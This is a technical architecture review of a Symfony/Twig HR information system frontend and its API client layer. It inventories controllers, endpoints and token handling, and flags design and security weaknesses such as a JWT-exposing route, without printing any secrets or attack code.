# 06 — WCH HRIS Frontend (Symfony/Twig): Architecture, API Client & Auth

**Analysed repository (READ-ONLY):** `/mnt/f/laragon/www/wchhris`
**Companion backend (REST API):** `/mnt/f/laragon/www/wchhris-api`
**Analysis date:** 2026-08-05
**Nothing in either repository was modified.**

---

## 0. Executive orientation

`wchhris` is **not** an SPA and **not** a pure server-side proxy. It is a **hybrid**:

| Layer | Technology | Role |
|---|---|---|
| PHP framework | Symfony **7.0** (`symfony/framework-bundle 7.0.*`), PHP `>=8.2` | Routing, Twig rendering, session, server-side API proxy |
| Templating | Twig (214 template files under `templates/`) | Full server-side HTML rendering |
| Front-end JS | **jQuery 3.7.1** + Toastify-JS + Choices.js + Flatpickr + list.js + SweetAlert2 (loaded, barely used) | Progressive enhancement, direct-to-API AJAX for some screens |
| Build | Webpack Encore (`assets/app.js` is essentially empty scaffolding); **almost all real assets are hand-dropped in `public/assets/`** | — |
| HTTP client (PHP→API) | `symfony/http-client` via `HttpClient::create()` — **not Guzzle** | `App\Service\APIRequest` |
| HTTP client (Browser→API) | `jQuery.ajax` wrapper in `public/assets/js/api.js` | `apiCall()` |
| Session | Native PHP file sessions (`storage_factory_id: session.storage.factory.native`) | Holds the raw JWT |
| Cache | Redis (`predis`, pool `cache.my_redis`) used in exactly 2 controllers | Employee profile / attachments |

**Source size (verified with `wc -l`):**

```
   1051 src/Controller/AdministrationController.php
    240 src/Controller/BIRConfigController.php
     17 src/Controller/Employee201Controller.php
    119 src/Controller/EmployeeLeavesController.php
    408 src/Controller/EmployeePayrollController.php
    185 src/Controller/EmployeePayrollProfileController.php
    797 src/Controller/EmployeeProfileController.php
     28 src/Controller/ErrorController.php
    242 src/Controller/HolidayController.php
    468 src/Controller/HomeController.php
    186 src/Controller/LeavePolicyController.php
    140 src/Controller/LeaveRequestController.php
   1285 src/Controller/ManpowerController.php
    141 src/Controller/OvertimeRequestController.php
    141 src/Controller/PagibigConfigController.php
     62 src/Controller/PayrollController.php
    450 src/Controller/PayrollReportsController.php
    141 src/Controller/PhilHealthConfigController.php
   1106 src/Controller/ProjectManagementController.php
    246 src/Controller/SSSConfigController.php
    354 src/Controller/SuperAdminController.php
    349 src/Service/APIFunctions.php
    178 src/Service/APIRequest.php
     50 src/Service/EmailService.php
   2668 src/Service/ExportXLSService.php
     20 src/Service/PSGCService.php
     45 src/EventListener/AlertListener.php
     34 src/EventListener/AuthorizationCheck.php
     54 src/EventListener/NotificationListener.php
    100 src/EventListener/SessionListener.php
     12 src/Components/Breadcrumb.php
     34 src/Utility/SessionManager.php
  11351 total
```

21 controller classes (the brief said "~22"; `ErrorController` and `Employee201Controller` are near-empty stubs).
Templates: `find templates -type f | wc -l` → **214**.
`public/assets/js/api.js` → **93 lines**. `public/assets/js/permission.js` → **87 lines**. `public/assets/js/global_functions.js` → **118 lines**.

---

## 1. Client ↔ Server architecture

### 1.1 Verdict: TWO parallel, duplicated data paths

There are **two independent API access paths that both talk to the same backend**, and they are *not* consistent with each other:

```
                                  ┌──────────────────────────────────────┐
  ┌──────────┐   (A) form POST /  │ Symfony frontend  (wchhris)          │
  │          │ ─────GET nav──────▶│  :8001                               │
  │ Browser  │                    │   Controller → APIRequest (PHP       │──── Bearer JWT ───▶ ┌─────────────┐
  │ (jQuery) │◀──── HTML/Twig ────│   symfony/http-client)               │                     │  wchhris-api│
  │          │                    │   session['token']                   │◀─── JSON ──────────  │  :8000      │
  │          │                    └──────────────────────────────────────┘                     │             │
  │          │                                                                                 │             │
  │          │  (B) GET /validate_call ───▶ returns the RAW JWT as JSON ──────────┐            │             │
  │          │                                                                    │            │             │
  │          │ ═══(B) $.ajax  http://127.0.0.1:8000/api/...  Authorization: Bearer <JWT> ═════▶│             │
  └──────────┘                                                                                 └─────────────┘
```

* **Path (A) — server-side proxy (the dominant pattern, ~95 % of traffic).**
  Every page navigation and almost every form submission goes to a Symfony route; the controller
  calls the REST API with `App\Service\APIRequest::apiRequest()` and renders Twig with the decoded array.
* **Path (B) — browser calls the API directly (SPA-like).**
  8 templates use the global `apiCall()` helper from `public/assets/js/api.js`, which issues
  `$.ajax` **straight at the API origin**, after first pulling the JWT out of the Symfony session
  through a dedicated JSON endpoint.

### 1.2 The exact API base URLs (hardcoded, three of them, in two places)

**PHP side — `src/Service/APIRequest.php` lines 20-22:**

```php
class APIRequest
{
    private $baseURL = "http://127.0.0.1:8000/" ;
    //private $baseURL = "https://hris-services.wrldcapitalholdings.com/" ;
    //private $baseURL = "http://wchhrisservices.techrostrum.com/" ;
```

**JS side — `public/assets/js/api.js` lines 5-9 and 63-65:**

```js
async function apiCall(method, route, jsonData) {
    const baseURL = "http://127.0.0.1:8000/";  // Update this to your actual base URL if needed
    // const baseURL = "https://hris-services.wrldcapitalholdings.com/"
    // const baseURL = "http://wchhrisservices.techrostrum.com/"
    const url = baseURL + route;
...
async function getToken() {
    const baseURL = "http://127.0.0.1:8001/"; // Update this to your actual base URL if needed
    // const baseURL = "http://wchhris.techrostrum.com/"
```

> **There is no `API_BASE_URL` (or any equivalent) environment variable.** `.env` contains only
> `APP_ENV`, `APP_DEBUG`, `APP_SECRET`, an unused `DATABASE_URL`, `MESSENGER_TRANSPORT_DSN` and
> `MAILER_DSN`. Switching environments is done by **editing source and commenting/uncommenting lines**.
>
> This is confirmed by `.gitlab-ci.yml`, which deliberately **excludes those two files from the
> deployment archive** so the manually-edited server copies survive:
>
> ```yaml
> - zip -r wchhris-latest.zip ./ -x ./var\* ./.env ./.env.test ./.git\* ./public/assets/js/api.js ./src/Service/APIRequest.php
> ```
>
> Known deployment targets inferred from the CI file and comments:
> `https://hris-services.wrldcapitalholdings.com/` (prod API), `http://wchhrisservices.techrostrum.com/`
> (staging API), frontend at `/var/www/hris.wrldcapitalholdings.com` (prod) and `/var/www/wchhris` (staging).

### 1.3 Token handling on both paths

**PHP path** — `src/Service/APIRequest.php` lines 23-40:

```php
public function apiRequest($method, $apiurl, $jsonBody, $token)
{
    if (!$method || !$apiurl) {
        throw new InvalidArgumentException("All parameters must not be empty");
    }

    $authorizationToken = 'Bearer ' . $token;
    $httpClient = HttpClient::create();
    $fullUrl = $this->baseURL . $apiurl;

    try {
        $response = $httpClient->request($method, $fullUrl, [
            'headers' => [
                'Content-Type' => 'application/json',
                'Authorization' => $authorizationToken,
            ],
            'body' => $jsonBody
        ]);
```

The `$token` is *always* read by the caller from the PHP session: `$request->getSession()->get('token')`.
Grep count: **`getSession()->get('token')` appears 200+ times across controllers and `APIFunctions`** —
it is never centralised.

**JS path** — the frontend exposes the raw JWT to JavaScript through
`HomeController::getToken()` (`src/Controller/HomeController.php` lines 237-255):

```php
#[Route('/validate_call', name: 'get_token')]
public function getToken(Request $request): JsonResponse
{
    // Retrieve the token from the session
    $token = $token = $request->getSession()->get('token');
    // If token doesn't exist, return an error
    if (!$token) {
        return $this->json([
            'error' => 'Token not found in session.'
        ], JsonResponse::HTTP_NOT_FOUND);
    }

    // Return the token as a JSON response
    return $this->json([
        'token' => $token,
    ], JsonResponse::HTTP_OK);
}
```

`api.js` caches it in a module-level variable and attaches it manually:

```js
let cachedToken = null; // Cache for the token
let tokenPromise = null; // Cache for the token promise to avoid duplicate calls
...
        const token = await getToken(); // Get the cached token or fetch it if not available
        return $.ajax({
            type: method,
            url: url,
            dataType: 'json',
            contentType: "application/json",
            data: jsonData ? JSON.stringify(jsonData) : null,
            headers: {
                'Authorization': token ? 'Bearer ' + token : ''
            },
```

### 1.4 What JS framework is used? — **none**

* No React/Vue/Angular/Alpine. No `fetch(`, no `axios`, no bare `XMLHttpRequest` anywhere in `templates/`
  (verified: `grep -rc "fetch(" templates --include=*.twig` returns **0 matches in every file**).
* Everything is **jQuery 3.7.1** (`public/assets/js/jquery/jquery-3.7.1.min.js`, loaded in
  `templates/partials/_vendor-scripts.html.twig` line 20) plus the vendored "Tailwick" admin theme
  bundle (`assets/js/tailwick.bundle.js`).
* `@hotwired/stimulus` and `@symfony/stimulus-bridge` are in `package.json` devDependencies but there is
  **no `assets/controllers/` directory** — Stimulus is unused scaffolding.
* Webpack Encore is configured (`webpack.config.js`, `config/packages/webpack_encore.yaml`) but
  `templates/partials/base.html.twig` never calls `encore_entry_script_tags()`; all assets are plain
  `{{ asset('assets/...') }}` links.

### 1.5 Exhaustive map of browser→API-direct calls (`apiCall()`)

`grep -rc "apiCall(" templates --include=*.twig`:

| Template | `apiCall()` count |
|---|---|
| `templates/manpower/apps-manpower.html.twig` | 21 |
| `templates/manpower/apps-emp-project.html.twig` | 5 |
| `templates/manpower/apps-attendance.html.twig` | 4 |
| `templates/project_management/apps-project.html.twig` | 3 |
| `templates/administration/user_settings.html.twig` | 3 |
| `templates/employee_profile/apps-employee-profile.html.twig` | 2 |
| `templates/project_management/subdivision-wizard.html.twig` | 1 |
| `templates/payroll/apps-hr-payroll-employee.html.twig` | 1 |
| **Total** | **40** |

Representative direct-to-API JS (`templates/manpower/apps-manpower.html.twig` lines 1203-1216):

```js
// Function to update attendance status via API call
async function updateAttendanceStatus(itemId, selectedValue) {
    const selectedWorkerId = $('#workerIdParams').data('worker-id');
    try {
        const apiUrl = `api/worker-overtime/update_attendance/${itemId}`;

        // Prepare data for POST request
        const requestData = {
            attendance_id: selectedValue
        };
        console.log('attendace updated')
        const response = await apiCall('POST', apiUrl, requestData);
```

Other raw API routes reached straight from the browser (same file):
`api/emp-tasks/adjust/${taskId}` (L1505), `api/workerlogs/get-latest-time/${selectedWorkerId}` (L1708),
`api/worker-overtime/deny/' + workerLogId` (L1690, `PATCH`),
`api/employee-projects-list/' + selectedWorkerId` (L1699, `POST`),
`api/attendance-types` (L1730 area, `GET`).

### 1.6 Exhaustive map of browser→Symfony-JSON calls (`$.ajax` to `path(...)`)

`grep -rc "\$\.ajax" templates --include=*.twig`:

| Template | `$.ajax` count | Targets |
|---|---|---|
| `templates/project_management/apps-project.html.twig` | 5 | `select_subdivision_profile`, `assign_workers_to_projects` (×2), `app_emp_project_json`, `update_selected_project_workers` |
| `templates/project_management/apps-phase.html.twig` | 2 | `update_blocks` |
| `templates/employee_profile/apps-employee-profile.html.twig` | 2 | profile picture / additional record |
| `templates/manpower/apps-manpower.html.twig` | 1 | — |
| `templates/manpower/apps-attendance.html.twig` | 1 | — |

Representative Symfony-proxied AJAX (`templates/project_management/apps-project.html.twig` lines 966-980):

```js
$.ajax({
    url: '{{ path("assign_workers_to_projects") }}', // Symfony route
    type: 'POST',
    data: formData,
    beforeSend: function () {
        $('#addNew').prop('disabled', true).text('Submitting...');
    },
    success: function (response) {
        console.log('Response:', response);
        if (response.status === 'success') {
            showToast(response.message, 'bg-green-500'); // Show success toast
        } else {
            showToast('Something went wrong!', 'bg-red-500'); // Show error toast
```

> **Consequence:** the same backend resources are reachable through two code paths with two different
> error-handling conventions, two different base-URL sources, and two different auth-attachment
> mechanisms. See §8.3.

---

## 2. The API client layer

### 2.1 `src/Service/APIRequest.php` (178 lines; only ~90 are live code, the rest is commented-out history)

Single public method. Registered as an autowired service via the catch-all `App\:` resource
declaration in `config/services.yaml`.

```php
namespace App\Service;
...
use Symfony\Component\HttpClient\HttpClient;

class APIRequest
{
    private $baseURL = "http://127.0.0.1:8000/" ;

    public function apiRequest($method, $apiurl, $jsonBody, $token)
```

| Aspect | Behaviour |
|---|---|
| **Base URL config** | Hardcoded private property. No env var, no parameter, no DI argument. Lines 20-22. |
| **Client instantiation** | `HttpClient::create()` **inside every call** — a brand-new client (and therefore a brand-new cURL handle/connection pool) per request. No injected `HttpClientInterface`, no connection reuse, no configured timeout, no retry, no `base_uri` option. |
| **Auth** | `'Authorization' => 'Bearer ' . $token` — always set, even when `$token` is `''` (login/forgot-password calls send the literal header `Bearer `). |
| **Content type** | Always `application/json`, even for `GET` requests that pass `[]` as body. |
| **Body** | Whatever the caller passes. Callers are inconsistent: some pass `json_encode($arr)`, some pass a raw PHP `[]` (which `symfony/http-client` treats as form fields → conflicts with the `Content-Type: application/json` header), some pass `null`. |
| **URL building** | Naive string concat `$this->baseURL . $apiurl`. Path params are interpolated by the caller (`'api/division/update/'.$division_id` or `"api/taxconfig/update/{$id}"`). **No URL-encoding of path segments.** |
| **Query strings** | Never used. Filtering/pagination is sent as a JSON body even on `GET` (e.g. `GET api/timesheet` with `json_encode(['dateFrom'=>…,'dateTo'=>…])`). |
| **Response parsing** | On 2xx it returns the **raw `Symfony\Contracts\HttpClient\ResponseInterface`**; the *caller* must call `->toArray()`. On non-2xx it returns an **array**. |
| **Error handling** | Returns a shape-shifting value — see below. |
| **Caching** | None in `APIRequest`. Redis caching exists only ad-hoc in `EmployeeProfileController`. |
| **Logging** | None. |
| **TLS / verify_peer** | Defaults (not disabled) — fine, but prod base URL is HTTPS while dev/staging comments are plain HTTP. |

**The polymorphic return value** (lines 42-89) is the single most important structural quirk of the whole frontend:

```php
            // Get the response status code
            $statusCode = $response->getStatusCode();

            // Check if the response status code indicates success
            if ($statusCode >= 200 && $statusCode < 300) {
                // Success response, return the response object to convert to array later
                return $response;
            }

            // Handle specific error cases (like 404 or 500) and return a custom error response
            return [
                'error' => true,
                'status' => $statusCode,
                'message' => $response->getContent(false),  // Don't throw an exception, return raw content
            ];

        } catch (ClientExceptionInterface $e) {   // 4xx
            return ['error' => true, 'status' => $e->getCode(), 'message' => 'Client error: ' . $e->getMessage()];
        } catch (ServerExceptionInterface $e) {   // 5xx
            return ['error' => true, 'status' => $e->getCode(), 'message' => 'Server error: ' . $e->getMessage()];
        } catch (TransportExceptionInterface $e) { // DNS/network
            return ['error' => true, 'status' => 0, 'message' => 'Network error: ' . $e->getMessage()];
        } catch (\Exception $e) {
            return ['error' => true, 'status' => 0, 'message' => 'Unexpected error: ' . $e->getMessage()];
        }
```

So the return type is `ResponseInterface|array`. Callers therefore have to type-sniff. The three
idioms actually found in the codebase are all present, and they are **not equivalent**:

```php
// Idiom 1 — "is it an array?"  (correct-ish)
if (is_array($response)) { … error path … }
$data = $response->toArray();

// Idiom 2 — "does it have ['error']?"  (correct-ish)
if (is_array($response) && isset($response['error']) && $response['error'] === true) { … }

// Idiom 3 — call ->getStatusCode() straight away  (FATAL on error: Call to a member function on array)
if ($this->apiFunctions->getDivision($request)->getStatusCode() === 200) { … }
$dashboard_count = $this->apiService->apiRequest('GET', 'api/dashboard', [], $token)->toArray();
```

Idiom 3 appears in `AdministrationController::viewDivision()` (L38), `viewOwner()` (L341),
`viewModels()` (L472), `viewUserSettings()` (L719), `EmployeeProfileController::viewProfile()` (L57),
`HomeController::index()` (L47) / `viewDashboard()` (L189), `ManpowerController::viewEmployees()`
(L49, L56), `EmployeePayrollProfileController::index()` (L36) and many more.
**If the API is down or returns 4xx/5xx, these produce an uncaught `Error: Call to a member function
getStatusCode() on array` → HTTP 500.**

Note also `symfony/http-client` is *lazy*: `$response->getStatusCode()` is what actually blocks and
triggers the transport exception, so the `try/catch` in `apiRequest()` does catch transport errors —
but a 4xx/5xx does **not** throw at `getStatusCode()`, it is caught by the explicit `$statusCode` check.

### 2.2 `src/Service/APIFunctions.php` (349 lines)

A thin, hand-written "read model" façade over `APIRequest`. Constructor-injects `APIRequest`.
**44 methods**, all with the same 5-line body:

```php
public function getDivisionList($request){
    $jsonBody = [];
    $token = $request->getSession()->get('token');
    $response = $this->apiService->apiRequest('GET', 'api/division/list', $jsonBody, $token);
    return $response;
}
```

Observations:

* Every method takes the whole `Request` object purely to reach the session — a service reaching into
  HTTP state rather than receiving a token. No `RequestStack` injection.
* Every method returns the raw polymorphic value (no `->toArray()`), pushing the branching to callers.
* `getEmployeesPaginated($request, $page, $limit)` is the only one that builds a body:
  `POST api/emp_paginated` with `json_encode(['page'=>…, 'limit'=>…])`.
* Two methods are exact duplicates: `getAffiliatedCompany()` and `getCompanyList()` both
  `GET api/affiliated-companies/list`.
* Comments are partly in Tagalog, e.g. line 155:
  `//eto yung employees na niremove na yung employees with same projects sa employee project table`.
* **`AdministrationController` re-implements 16 of these methods privately** (lines 938-1050) —
  `getDivision`, `getDepartment`, `getOwner`, `getModel`, `getModelTypes`, `getEmployees`,
  `getEmployeesPaginated`, `getDivisionList`, `getWorker`, `getSubdivision`, `getPhase`, `getProject`,
  `getEmpProjects`, `getEmpProjectsId`, `getUserTypes`, `getShifts` — byte-identical to `APIFunctions`
  and **dead code** (the controller actually calls `$this->apiFunctions->…`).

### 2.3 API surface consumed by the frontend

Counts: **161** direct `apiService->apiRequest(...)` calls inside controllers + **44** inside
`APIFunctions` = **205** PHP call sites, hitting **≈148 distinct backend endpoints**
(138 single-quoted literals + 10 double-quoted interpolated ones), plus ~7 more reached only from JS.

Per-controller `apiRequest()` density:

```
AdministrationController      35     HolidayController              6
HomeController                22     EmployeePayrollController      5
ProjectManagementController   20     SuperAdminController           4
ManpowerController            18     SSSConfigController            4
EmployeeProfileController     13     BIRConfigController            4
PayrollReportsController      12     PhilHealthConfigController     3
                                     PagibigConfigController        3
                                     LeavePolicyController          3
                                     EmployeePayrollProfileController 3
                                     OvertimeRequestController      2
                                     LeaveRequestController         2
                                     EmployeeLeavesController       2
                                     PayrollController              0
                                     ErrorController                0
                                     Employee201Controller          0
```

Full distinct endpoint list (verb + path prefix; trailing `/` means an id is appended by the caller):

<details>
<summary>148 endpoints</summary>

```
DELETE api/employee-payroll-profile/delete/$id     GET  api/payroll-groups/list/
DELETE api/employee-projects/archive/              GET  api/payrollsheet
DELETE api/holiday/config/delete/                  GET  api/payrollsheet-with-cash-advances
DELETE api/owner/archive/                          GET  api/payrollsheet-with-salary-adjustment
DELETE api/pagibigconfig/delete/{$id}              GET  api/payrollsheet-with-taxshield
DELETE api/philhealthconfig/delete/{$id}           GET  api/phase
DELETE api/sssconfig/delete/                       GET  api/philhealthconfig/list
DELETE api/taxconfig/delete/{$id}                  GET  api/project
DELETE api/user-types/delete/                      GET  api/project-emp/
DELETE api/yearly-holiday/delete/                  GET  api/shifts
GET  api/accountability_records/find-by-emp/       GET  api/sssconfig/list
GET  api/accountability_records/list               GET  api/subdivision
GET  api/affiliated-companies/list                 GET  api/super_admin/connections
GET  api/attendance-types                          GET  api/taxconfig/list
GET  api/category                                  GET  api/timesheet
GET  api/company-gov-total-dues                    GET  api/user-types
GET  api/dashboard                                 GET  api/user-types-permission
GET  api/department            GET api/department/ GET  api/worker
GET  api/division              GET api/division/   GET  api/yearly-holiday/list
GET  api/division/list                             PATCH api/department/archive/
GET  api/employee-leaves/find/                     PATCH api/division/archive/
GET  api/employee-leaves/list                      PATCH api/model-types/archive/
GET  api/employee-payroll-profile/find/            PATCH api/shifts/archive/
GET  api/employee-projects   GET api/employee-projects/
GET  api/employee/additional_record                POST api/accountability_records/create
GET  api/employee/profile                          POST api/blocks/update
GET  api/employee/view_attachment                  POST api/category/create|delete|update
GET  api/employee201                               POST api/create/shifts
GET  api/employee201/emp_proj/                     POST api/department/create
GET  api/employees-payroll                         POST api/division/create
GET  api/get-payroll-summary                       POST api/dtr-filter-by-activity|emp|project
GET  api/gov-total-dues                            POST api/emp-tasks-dtr/create
GET  api/holiday/config/list                       POST api/emp-tasks/create
GET  api/leave-policy/list                         POST api/emp_paginated
GET  api/leave/request/find/                       POST api/employee-projects/create
GET  api/leave/request/list                        POST api/employee-projects/unassign
GET  api/leave/request/list-approved               POST api/employee/delete_attachment
GET  api/model                                     POST api/employee/upload_attachment
GET  api/model-types                               POST api/employee201/create
GET  api/notifications/find-by-employee/           POST api/employee201/create_list
GET  api/overtime_requests/find-by-emp/            POST api/employee_project/create
GET  api/overtime_requests/list                    POST api/forget_password
GET  api/owner                                     POST api/holiday-config/create-holidays
GET  api/pagibigconfig/list                        POST api/leave-policy/create
                                                   POST api/leave/request/create
POST api/login                                     POST api/model-types
POST api/model/create|delete/|update/              POST api/overtime_requests/create
POST api/owner/create                              POST api/pagibigconfig/create
POST api/phase/create|delete|update                POST api/philhealthconfig/create
POST api/project/assign-workers                    POST api/project/assign-workers-with-status
POST api/project/create|delete|update              POST api/project/subdivision/update
POST api/reset_password                            POST api/revalidate-session
POST api/sssconfig/create                          POST api/sssconfig/import
POST api/subdivision/create|delete|update          POST api/subdivision_profile/select
POST api/taxconfig/create                          POST api/taxconfig/import
POST api/user-types                                POST api/user/update/
POST api/validate_reset_token                      POST api/wizard/create
POST api/worker_logs/create                        POST api/yearly-holiday/create-list
PUT  api/accountability_records/update/            PUT  api/department/update/
PUT  api/division/update/                          PUT  api/employee-leaves/update
PUT  api/employee-payroll-profile/update/$id       PUT  api/employee201/update
PUT  api/holiday/config/update/                    PUT  api/leave-policy/update/
PUT  api/leave/request/approve/                    PUT  api/main-modules/
PUT  api/model-types/                              PUT  api/overtime_requests/update-status/
PUT  api/overtime_requests/update/                 PUT  api/owner/update/
PUT  api/pagibigconfig/update/{$id}                PUT  api/philhealthconfig/update/{$id}
PUT  api/selected-employee-leaves/update/          PUT  api/shifts/
PUT  api/sssconfig/update/{$id}                    PUT  api/taxconfig/update/{$id}
PUT  api/yearly-holiday/update/

Browser-only (never called from PHP):
POST  api/worker-overtime/update_attendance/{id}   POST api/emp-tasks/adjust/{taskId}
GET   api/workerlogs/get-latest-time/{workerId}    PATCH api/worker-overtime/deny/{workerLogId}
POST  api/employee-projects-list/{workerId}        GET  api/attendance-types
```
</details>

### 2.4 `public/assets/js/api.js` — the JS twin of `APIRequest` (93 lines)

```js
let cachedToken = null; // Cache for the token
let tokenPromise = null; // Cache for the token promise to avoid duplicate calls

async function apiCall(method, route, jsonData) {
    const baseURL = "http://127.0.0.1:8000/";
    const url = baseURL + route;
    console.log(JSON.stringify(jsonData));          // ← logs every payload to the console

    try {
        const token = await getToken();
        return $.ajax({
            type: method, url: url, dataType: 'json',
            contentType: "application/json",
            data: jsonData ? JSON.stringify(jsonData) : null,
            headers: { 'Authorization': token ? 'Bearer ' + token : '' },
            success: function (response) { console.log('Success:', response); },
            error: function (xhr, status, error) {
                console.log('Error:', error);
                let errorMessage = 'An error occurred';
                if (xhr.responseJSON && xhr.responseJSON.message) { errorMessage = xhr.responseJSON.message; }
                showToast(errorMessage, 'bg-red-500');
            }
        });
    } catch (error) {
        console.error("Error occurred:", error);
        showToast('An unexpected error occurred', 'bg-red-500');
        return $.Deferred().reject(error).promise();
    }
}
```

* Token caching: `cachedToken` never expires and is never invalidated on 401 → after a server-side
  session rotation the SPA-ish screens keep sending a stale JWT until a full page reload.
* `getToken()` hits `http://127.0.0.1:8001/validate_call` — the **frontend** origin, hardcoded
  separately from the API origin.
* `showToast()` (lines 45-61) is defined here, which is why the PHP `AlertListener` and inline
  controller snippets can emit `<script>showToast(...)</script>`.

### 2.5 Other services

| Service | Lines | Role |
|---|---|---|
| `src/Service/EmailService.php` | 50 | Sends the password-reset email **from the frontend**, not the API. `->from('noreply@example.com')` is hardcoded; renders `emails/reset_password_link.html.twig`; builds `resetUrl` as `sprintf('%s/reset_password/%s', $request->getSchemeAndHttpHost(), $token)`. Uses `MAILER_DSN` from `.env` (which contains a **real Gmail app password in cleartext**, see §8.7). |
| `src/Service/ExportXLSService.php` | 2668 | PhpSpreadsheet report writer. 14 live public methods (`exportProjects`, `exportTasks`, `exportEmployeeTasks`, `generateManpowerMonitoringReport`, `generateSalaryAdjustmentsReport`, `generateTimeSheetReport`, `generatePayrollSheetReport`, `generatePayrollRegisterReport`, `generatePayrollSummaryReport`, `generateCashAdvanceReport`, `generateTaxShieldReport`, `generateContributionReport`, `generateTotalContributionReport`) plus ~6 commented-out older versions. Each writes to `tempnam(sys_get_temp_dir(), 'phpspreadsheet')`, then `file_get_contents()` the whole file into memory and returns `new Response(...)` with `Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` and a `Content-Disposition` header. Most use `attachment; filename="<Report>_<date>.xlsx"`, but three (`exportProjects` L183, `exportTasks` L517, `generateManpowerMonitoringReport`’s sibling at L872) still emit the copy-pasted **`inline; filename="timesheet.xlsx"`**. Temp files are never unlinked. |
| `src/Service/PSGCService.php` | 20 | Two methods, `getProvinces()` and `getTownCity()`, each returning a **single giant hardcoded PHP array literal on one line** (the Philippine Standard Geographic Code list). No API call, no file load, no cache. Injected twice into several controllers (`PSGCService $getProvinces, PSGCService $getTownCity` — the same service instance under two property names). |
| `src/Utility/SessionManager.php` | 34 | `invalidateSessionsByUserType(string $userTypeCode)`: `glob()`s a session-storage directory, `file_get_contents()` each file and `unlink()`s any whose serialized payload contains the user-type string. Constructor requires `string $sessionStoragePath`, which is **not bound in `config/services.yaml`** → the service cannot be autowired and **nothing in the codebase references it**. Dead code, and a substring match against raw session files is unsafe. |
| `src/Components/Breadcrumb.php` | 12 | Symfony UX Twig Component `#[AsTwigComponent('breadcrumb')]` with three public props `$title`, `$pagetitle`, `$pageLink`; template `templates/components/Breadcrumb.html.twig`. Used as `{{ component('breadcrumb', { pagetitle: 'Division', title: 'Division' }) }}`. |

---

## 3. Controller-by-controller inventory

Legend for the **Data-fetch** column:

* **SSR-proxy** = controller calls the API server-side and passes decoded arrays to Twig.
* **JSON-proxy** = controller returns `JsonResponse` for browser `$.ajax` (still server-side proxying).
* **Direct-JS** = the rendered template additionally calls the API straight from the browser via `apiCall()`.
* **File** = returns a binary (XLSX / download).
* **Static** = renders a template with no API data.

All routes are attribute-based (`config/routes.yaml` loads `../src/Controller/` with `type: attribute`).
Only 4 controllers have a class-level prefix: `EmployeeLeavesController` (`/employee-leaves`),
`HolidayController` (`/holidays`), `LeavePolicyController` (`/leave-policy`),
`LeaveRequestController` (`/leave-request`). The rest declare full paths per method — and several
**omit the leading slash** (`management/division`, `manpower/employee`, `project/subdivisions`,
`administration/owner`, `payroll/payslip`, `form/submit_employee`), which Symfony tolerates but which
makes the route table inconsistent.

### 3.1 `HomeController` (468 lines) — auth + dashboard

| Route | Name | Method | Template / Output | Data fetch |
|---|---|---|---|---|
| `/` | `home` | any | `dashboards-hr.html.twig` or `auth-login-boxed.html.twig` | SSR-proxy `GET api/dashboard` |
| `/validate_login` | `validate_login` | any (form POST) | redirect | SSR-proxy `POST api/login` |
| `/revalidate-session` | `revalidate_session` | any | redirect | SSR-proxy `POST api/revalidate-session` |
| `/login` | `login` | any | `auth-login-boxed.html.twig` | Static |
| `/auth-logout-boxed` | `logout` | any | `auth-login-boxed.html.twig` | Session invalidate |
| `/dashboards-hr` | `dashboard` | any | `dashboards-hr.html.twig` | SSR-proxy `GET api/dashboard` |
| `/validate_call` | `get_token` | any | **JSON `{token: …}`** | Session read — **JWT leak endpoint** |
| `/forget_password` | `forget_password` | any | `forget_password/auth-reset-password-basic.html.twig` | Static |
| `/email_forget_password` | `email_forget_password` | any | same template | SSR-proxy `POST api/forget_password` + `EmailService` |
| `/reset_password/{token}` | `reset_password` | any | `forget_password/auth-create-password-basic.html.twig` | SSR-proxy `POST api/validate_reset_token` |
| `/form/submit/reset_password` | `form_reset_password` | any | `forget_password/auth-reset-password-success.html.twig` | SSR-proxy `POST api/validate_reset_token` then `POST api/reset_password` |

Twig variables for the dashboard (`HomeController::viewDashboard()` L206-217) — note the controller
flattens one API payload into 9 separate variables:

```php
return $this->render('dashboards-hr.html.twig', [
    'divisions'         => $dashboard_count['divisionCount'],
    'departments'       => $dashboard_count['departmentCount'],
    'projects'          => $dashboard_count['projectCount'],
    'employees'         => $dashboard_count['employeeRecordsCount'],
    'subdivisions'      => $dashboard_count['subdivisionCount'],
    'owners'            => $dashboard_count['ownersCount'],
    'models'            => $dashboard_count['facilitiesCount'],
    'dtr_count'         => $dashboard_count['dtrRecordsDailyCount'],
    'manpower_count'    => $dashboard_count['manpowerAssignmentCount'],
    'javascriptSnippet' => $javascriptSnippet,
]);
```

There is also a commented-out catch-all route `#[Route('/{path}')] public function root(...)`
(L220-235) that used to render arbitrary templates by name — thankfully disabled.

### 3.2 `AdministrationController` (1051 lines) — reference-data CRUD

| Route | Name | Template | Data fetch |
|---|---|---|---|
| `management/division` | `division` | `administration/division.html.twig` | SSR-proxy `getDivision`, `getEmployees` |
| `management/department` | `department` | `administration/department.html.twig` | SSR-proxy `getDepartment`, `getDivision` |
| `management/position` | `position` | `administration/position.html.twig` | Static |
| `administration/owner` | `view_owner` | `administration/owner.html.twig` | SSR-proxy `getOwner` |
| `administration/models` | `view_models` | `administration/models.html.twig` | SSR-proxy `getModel`, `getModelTypes` |
| `administration/model-types` | `adm_model_types` | `administration/model_types.html.twig` | SSR-proxy `getModelTypes` |
| `administration/user-settings` | `adm_user_settings` | `administration/user_settings.html.twig` | SSR-proxy `getDivisionList`, `getEmployeesPaginated`, `getUserTypes`, `getShifts` + **Direct-JS** (3 `apiCall`s) |
| `administration/shifts` | `adm_shifts` | `administration/empShifts.html.twig` | SSR-proxy `getShifts` |
| `/form/submit_division` `/form/update_division` `/form/archive_division` | `submit_division` / `update_division` / `archive_division` | redirect to `division` | `POST api/division/create`, `PUT api/division/update/{id}`, `PATCH api/division/archive/{id}` |
| `/form/submit_department` `/form/update_department` `/form/archive_department` | ditto | redirect to `department` | `POST/PUT/PATCH api/department/*` |
| `/form/submit_owner` `/form/update_owner` `/form/delete_owner` | ditto | redirect to `view_owner` | `POST api/owner/create`, `PUT api/owner/update/{id}`, `DELETE api/owner/archive/{id}` |
| `/form/submit_model` `/form/update_model` `/form/archive_model` | ditto | redirect to `view_models` | `POST api/model/create|update/{id}|delete/{id}` |
| `/form/submit_model_types` `/form/update_model_types` `/form/archive_model_types` | ditto | redirect to `adm_model_types` | `POST api/model-types`, `PUT api/model-types/{id}`, `PATCH api/model-types/archive/{id}` |
| `/form/update_emp_settings` | `update_emp_setting` | redirect to `adm_user_settings` | `POST api/user/update/{id}` |
